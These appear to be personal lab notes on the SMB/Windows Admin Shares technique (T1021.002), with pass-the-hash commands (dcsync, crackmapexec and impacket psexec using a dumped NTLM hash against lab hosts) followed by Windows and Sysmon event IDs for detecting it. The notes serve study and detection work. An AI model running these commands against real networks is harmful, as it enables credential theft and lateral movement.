
Smb/Windows Admin  Shares T1021.002

PTH

```CS
dcsync soheil.lab soheil\administrator
ae974876d974abd805a989ebead86846
crackmapexec smb 192.168.100.5 -u Administrator -H ae974876d974abd805a989ebead86846 -x ipconfig
python3 /usr/share/doc/python3-impacket/examples/psexec.py administrator:@192.168.100.6 -hashes 00000000000000000000000000000000:ae974876d974abd805a989ebead86846

```

Windows Event Viewer:

- Event ID 5140 (Windows Server 2008 and later): A network share object was accessed, which could indicate an adversary attempting to access sensitive files via SMB/Windows Admin Shares.
    
- Event ID 5142 (Windows Server 2008 and later): A network share object was added or removed, which could indicate an adversary attempting to create or modify SMB/Windows Admin Shares for malicious purposes.
    

Sysmon:

- Event ID 3 - Network connections: Monitor for network connections made to SMB/Windows Admin Shares, especially those originating from unexpected or unauthorized sources.
    
- Event ID 10 - Process accessed: Monitor for processes accessing file-sharing related processes or services, such as smb.exe, net.exe, or PowerShell commands related to SMB, especially those with unusual command-line arguments or suspicious behaviors.

